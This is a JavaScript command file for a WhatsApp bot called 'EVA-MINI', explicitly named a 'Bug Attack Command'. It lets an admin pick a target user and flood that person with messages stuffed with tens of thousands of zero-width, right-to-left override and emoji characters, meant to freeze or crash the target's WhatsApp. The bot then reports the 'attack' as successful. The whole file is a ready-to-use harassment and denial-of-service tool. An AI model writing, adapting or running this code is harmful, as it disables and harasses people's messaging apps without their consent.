// commands/bug.js - Bug Attack Command for EVA-MINI
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACTION - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '🐛',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // OWNER/ADMIN CHECK
        // ============================================
        const sender = msg.key.participant || from;
        const botNumber = jidNormalizedUser(sock.user.id);
        const isOwner = sender.includes(botNumber.split('@')[0]) || msg.key.fromMe;
        
        let isAdmin = isOwner;
        if (!isAdmin && from.endsWith('@g.us')) {
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participant = groupMetadata.participants.find(p => p.id === sender);
                isAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
            } catch (e) {
                isAdmin = false;
            }
        }

        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins/owner can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // GET TARGET
        // ============================================
        let target;
        const q = args.join(' ');
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;

        if (q && q.match(/\d/)) {
            const cleanNumber = q.replace(/\D/g, '');
            target = jidNormalizedUser(cleanNumber + '@s.whatsapp.net');
        } else if (mentioned) {
            target = mentioned;
        } else if (quoted) {
            target = quoted;
        } else {
            await sock.sendMessage(from, {
                text: `⚠️ *Usage:* .bug [@mention] or reply to user\n\n📌 *Example:* .bug @94703945265\n\n🐛 *Send bug payload to target!*`
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const targetNumber = target.split('@')[0];
        const statusMsg = await sock.sendMessage(from, {
            text: `🐛 *Sending bug payload to @${targetNumber}...*\n\n⏳ Please wait...`,
            mentions: [target]
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '⏳',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // SEND BUG PAYLOADS
        // ============================================
        const bugEmojis = [
            '💀', '☠️', '👻', '🔥', '⚡', '💥', '🧨', '💣',
            '😈', '👿', '👾', '🤖', '💀', '☠️', '👻', '🔥'
        ];

        let successCount = 0;
        let totalMessages = 25;

        for (let i = 0; i < totalMessages; i++) {
            try {
                // Create bug payload with invisible characters
                const invisibleChars = '\u200B'.repeat(5000) + '\u200C'.repeat(5000) + '\u200D'.repeat(5000);
                const emojiPart = bugEmojis.join('').repeat(50);
                const payload = `${invisibleChars}${emojiPart}\n🐛 BUG PAYLOAD #${i + 1}\n${invisibleChars}`;
                
                await sock.sendMessage(target, { text: payload });
                successCount++;
                
                // Small delay between messages
                await new Promise(resolve => setTimeout(resolve, 200));
            } catch (e) {
                console.log(`Bug payload ${i + 1} failed:`, e.message);
            }
        }

        // ============================================
        // SEND EXTRA PAYLOADS FOR MAX EFFECT
        // ============================================
        try {
            // Send corrupted text with RTL characters
            const rtlPayload = '\u202A'.repeat(5000) + '\u202D'.repeat(5000) + '\u202E'.repeat(5000) + '\u200B'.repeat(5000);
            await sock.sendMessage(target, { text: rtlPayload });
            successCount++;
            
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Send massive emoji payload
            const emojiPayload = '💀'.repeat(10000) + '☠️'.repeat(10000) + '👻'.repeat(10000);
            await sock.sendMessage(target, { text: emojiPayload });
            successCount++;
        } catch (e) {
            console.log('Extra payload failed:', e.message);
        }

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        await sock.sendMessage(from, {
            text: `🐛 *Bug payload delivered!*\n\n📱 *Target:* @${targetNumber}\n📊 *Messages:* ${successCount} sent\n💥 *Status:* SUCCESS\n\n⚠️ *Target's WhatsApp may experience issues!*`,
            mentions: [target]
        });

        // ============================================
        // FINAL REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

        // ============================================
        // OWNER REPORT (Optional)
        // ============================================
        try {
            await sock.sendMessage(botNumber, {
                text: `🐛 *Bug Attack Report*\n\n📱 *Target:* @${targetNumber}\n👤 *By:* ${msg.pushName || 'Unknown'}\n📊 *Messages:* ${successCount}\n✅ *Status:* SUCCESS\n🕐 *Time:* ${new Date().toLocaleString()}`,
                mentions: [target]
            });
        } catch (e) {}

    } catch (error) {
        console.error('Bug command error:', error);
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}`
        });
    }
};